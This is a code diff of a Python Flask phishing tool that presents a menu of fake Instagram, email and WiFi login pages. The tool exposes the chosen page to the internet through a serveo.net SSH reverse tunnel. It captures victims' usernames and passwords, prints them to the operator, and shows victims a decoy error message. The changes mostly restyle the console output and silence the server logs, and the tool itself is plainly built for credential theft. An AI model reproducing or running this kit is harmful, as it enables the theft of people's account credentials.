@@ -31,19 +31,11 @@ cyan  = '\033[1;36m'
 pink  = '\033[1;35m'
 reset = '\033[0m'
 
-# -------- Suppress Flask logs --------
+# -------- Suppress Flask logs completely --------
+cli = sys.modules['flask.cli']
+cli.show_server_banner = lambda *x: None
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
-
-# -------- Box Printer --------
-BOX_WIDTH = 60
-def print_box(title, content_lines, color=cyan):
-    """Prints a neat aligned box"""
-    print(pink + "╔" + "═" * (BOX_WIDTH - 2) + "╗" + reset)
-    for line in content_lines:
-        line = line.strip()
-        print(pink + "║ " + color + f"{line:<{BOX_WIDTH-4}}" + reset)
-    print(pink + "╚" + "═" * (BOX_WIDTH - 2) + "╝" + reset)
 
 # -------- Banner --------
 def banner():
@@ -53,11 +45,11 @@ def banner():
 |  _ \\|  _ \\ / _ \\  |  _ \\ 
 | |_) | |_) | | | | | | | |
 |  __/|  _ <| |_| | | |_| |
-|_|   |_| \\_\\\\___/  |____/ 
-
-{cyan}        PRO D
-{pink}   Created by Dhani v1.0{reset}
+|_|   |_| \\_\\\\___/  |____/ {reset}
 """)
+    print(f"""{pink}╔══════════════════════════════════════════════╗
+║              {cyan}PRO D  v1.0 by Dhani{pink}            
+╚══════════════════════════════════════════════╝{reset}\n""")
 
 # -------- Flask App --------
 app = Flask(__name__)
@@ -76,11 +68,13 @@ def login():
     password = request.form.get("password")
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    print_box("Captured Login", [
-        f"Username: {username}",
-        f"Password: {password}",
-        f"Time    : {timestamp}"
-    ], cyan)
+    print(f"""{pink}
+╔══════════════════════════════════════════════╗
+║ {cyan}Username:{ylo} {username}{reset}
+║ {cyan}Password:{ylo} {password}{reset}
+║ {cyan}Time    :{ylo} {timestamp}{reset}
+╚══════════════════════════════════════════════╝
+""")
     return "Something went wrong again later :("
 
 # -------- Find free port --------
@@ -92,7 +86,7 @@ def get_free_port(start_port=8080):
                 return port
             port += 1
 
-# -------- Spinner Animation --------
+# -------- Animation --------
 stop_spinner = False
 def spinner():
     for c in itertools.cycle(['|', '/', '-', '\\']):
@@ -107,22 +101,29 @@ def spinner():
 def run_server():
     port = get_free_port(8080)
 
-    print_box("Server", ["Starting server..."], cyan)
+    print(f"{pink}╔══════════════════════════════════════════════╗")
+    print(f"{cyan}Starting server...{reset}")
+    print(f"{pink}╚══════════════════════════════════════════════╝{reset}\n")
 
-    # Start Serveo tunnel
+    # Start Serveo tunnel in background
     ssh_cmd = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net"
     process = subprocess.Popen(ssh_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
 
-    # Print tunnel URL nicely
+    # Print tunnel URL 
     for line in process.stdout:
         if "Forwarding HTTP" in line:
             public_url = line.strip().split()[-1]
-            print_box("Public Link", [f"Public Link → {public_url}"], ylo)
+            print(f"""{grn}
+╔══════════════════════════════════════════════╗
+║ {cyan}Public Link → {ylo}{public_url}{reset}
+╚══════════════════════════════════════════════╝
+""")
+            # Start  animation
             threading.Thread(target=spinner, daemon=True).start()
             break
 
-    # Run Flask (blocking)
-    app.run(host="127.0.0.1", port=port, debug=False)
+    # Run Flask silently (no logs)
+    app.run(host="127.0.0.1", port=port, debug=False, use_reloader=False)
 
 # -------- Main --------
 if __name__ == "__main__":
@@ -130,15 +131,16 @@ if __name__ == "__main__":
 
     # ----- menu -----
     print(f"""{pink}
-╔══════════════════════╗
+╔══════════════════════════════════════════════╗
 ║ {cyan}Choose Page Template{pink}
-╠══════════════════════╣
-║ [1] instagram
-║ [2] email
-║ [3] WiFi
-╚══════════════════════╝
+╠══════════════════════════════════════════════╣
+║ [1] Instagram                                
+║ [2] Email                                    
+║ [3] WiFi                                     
+╚══════════════════════════════════════════════╝
 {reset}""")
     choice = input(f"{ylo}Enter your choice (1/2/3): {reset}").strip()
+
     if choice == "1":
         selected_html = "11.html"
     elif choice == "2":
@@ -146,7 +148,7 @@ if __name__ == "__main__":
     elif choice == "3":
         selected_html = "3.html"
     else:
-        print(red + "Invalid choice, defaulting to instagram." + reset)
-        selected_html = "11.html"
+        print(f"{red}Invalid choice, defaulting to Instagram.{reset}")
+        selected_html = "1.html"
 
     run_server()
